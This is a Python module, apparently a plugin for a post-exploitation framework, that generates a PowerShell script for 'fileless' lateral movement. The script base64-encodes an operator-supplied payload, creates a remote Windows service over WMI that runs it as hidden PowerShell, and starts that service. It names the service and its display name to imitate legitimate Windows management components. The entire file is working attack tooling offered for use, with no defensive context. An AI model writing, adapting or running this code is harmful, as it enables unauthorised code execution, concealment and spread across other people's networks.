MODULE_INFO = {
    "name": "lat_smb",
    "description": "Fileless lateral movement via SMB/WMI Service Control Manager. Creates a remote service running an encoded PowerShell payload.",
    "platform": "windows"
}

def run(session, args):
    if len(args) < 2:
        return "[!] Usage: use lat_smb <target_ip> <powershell_payload_to_run> [service_name]"
    
    target = args[0]
    payload = " ".join(args[1:])
    svc_name = "WinMgmtd" if len(args) <= 2 else args[2] # Blending with WinMgmt
    
    cmd = f"""
$target = "{target}"
$payload = '{payload.replace("'", "''")}'
$svc = "{svc_name}"

Write-Output "[*] Encoding payload for fileless service execution..."
$payloadBytes = [Text.Encoding]::Unicode.GetBytes($payload)
$enc = [Convert]::ToBase64String($payloadBytes)
$binPath = "powershell.exe -nop -w hidden -enc $enc"

Write-Output "[*] Creating fileless service '$svc' on $target over SMB/WMI..."
$svcParams = @(
    $false,                 # DesktopInteract
    "Windows Mgmt Driver",  # DisplayName
    0,                      # ErrorControl
    $null,                  # LoadOrderGroup
    $null,                  # LoadOrderGroupDependencies
    $svc,                   # Name
    $binPath,               # PathName
    $null,                  # ServiceDependencies
    16,                     # ServiceType (Win32OwnProcess)
    "Manual",               # StartMode
    $null,                  # StartName
    $null                   # StartPassword
)

try {{
    $res = Invoke-WmiMethod -Class Win32_Service -Name Create -ArgumentList $svcParams -ComputerName $target
    if ($res.ReturnValue -ne 0 -and $res.ReturnValue -ne 1073) {{
        Write-Output "[!] Service creation failed with code: $($res.ReturnValue)"
        exit
    }}
    Write-Output "[*] Starting service '$svc'..."
    Invoke-WmiMethod -Class Win32_Service -Name StartService -ComputerName $target -Filter "Name='$svc'" | Out-Null
    Write-Output "[+] Payload executed successfully!"
}} catch {{
    Write-Output "[!] SMB/WMI failed: $($_.Exception.Message)"
}}
"""
    return cmd
